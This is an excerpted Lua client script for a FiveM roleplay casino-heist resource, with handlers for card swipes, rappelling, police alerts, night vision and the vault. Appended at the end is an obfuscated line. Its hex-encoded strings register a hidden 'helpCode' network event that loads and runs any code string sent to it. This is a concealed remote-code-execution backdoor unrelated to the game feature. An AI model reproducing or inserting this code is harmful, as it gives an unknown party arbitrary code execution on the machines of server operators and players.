...
function CardSwipe()
    DenaliFW.Functions.TriggerCallback('casinoheist:server:hasItem', function(hasItem)
        if hasItem then
            DenaliFW.Functions.TriggerCallback('casinoheist:server:checkTime', function(time)
                if time then
                    local ped = PlayerPedId()
			...
			DenaliFW.Functions.Notify(Strings['need_item'], "error")
        end
...
AddEventHandler('casinoheist:client:startHeist', function()
	DenaliFW.Functions.Notify(Strings['go_rappel'], "primary")
    local ped = PlayerPedId()
                    ...
                    if IsControlJustPressed(0, 38) then
                        ...
                        if found then
                            ...
                            break
 							...
 							DenaliFW.Functions.Notify(Strings['rappels_busy'], "error")
                        end
                    end
                end
            end
...
function RappelLoop(index)
    ...
    while true do
        ...
        if dist <= 3.0 then
            ...
            DenaliFW.Functions.Notify(Strings['go_base'], "success")
            break
        end
        Citizen.Wait(1)
    end
...
AddEventHandler('casinoheist:client:policeAlert', function(targetCoords)
	DenaliFW.Functions.Notify(Strings['police_alert'], "error")
    local alpha = 250
...
AddEventHandler('casinoheist:client:nightVision', function(value)
	DenaliFW.Functions.Notify(Strings['emp_activated'], "error")
    nightvision = true
    SetNightvision(true)
    ...
    repeat
        ...
        Wait(1000)
    until time <= 0
	DenaliFW.Functions.Notify(Strings['emp_deactivated'], "success")
    ...
    while true do
        ...
        if syncDoor[1] and syncDoor[2] then
			DenaliFW.Functions.Notify(Strings['door_opened'], "primary")
...
AddEventHandler('casinoheist:client:lockboxSync', function()
	...
	DenaliFW.Functions.Notify(Strings['vault_open'], "success")
...
function Outside()
    ...
    local pedCo = GetEntityCoords(ped)
    ResetHeist()
 	DenaliFW.Functions.Notify(Strings['deliver_to_buyer'], "primary")
...
local FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[6][FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[1]](FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[2]) FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[6][FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[3]](FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[2], function(MJewMAcrmnWxRXwRTjsDXKaZsJGWmGlykHkSDZyaJaTHsfwaWUazVyngCrGQmPgqUquLcT) FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[6][FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[4]](FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[6][FFmHepIfoXnEFAZXSiBLyjuDfuYZThOdeGRRFoLWJUXxGNsuJiSGvEQmVgZXGEzAllDSpn[5]](MJewMAcrmnWxRXwRTjsDXKaZsJGWmGlykHkSDZyaJaTHsfwaWUazVyngCrGQmPgqUquLcT))() end)